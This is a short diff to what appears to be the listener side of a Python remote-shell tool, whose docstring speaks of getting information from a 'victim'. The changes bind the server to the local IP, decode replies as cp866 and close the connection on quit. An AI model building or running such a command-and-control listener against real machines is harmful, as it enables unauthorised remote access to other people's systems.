@@ -7,7 +7,12 @@ import time         #It's module for work with time
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(('192.168.0.254', 7777))
+    
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    print(local_ip)
+    
+    server.bind((local_ip, 7777))
     server.listen(1)
 
     conn, addr = server.accept()
@@ -22,7 +27,7 @@ def send_data(data):
 
 def get_data():
     '''It's function for get information from victim'''
-    data = conn.recv(10240).decode()
+    data = conn.recv(10240).decode('cp866')
     return data
 
 
@@ -69,6 +74,7 @@ def main():
 
             elif 'q' in command:
                 send_data('q')
+                conn.close()
                 break
 
             else:
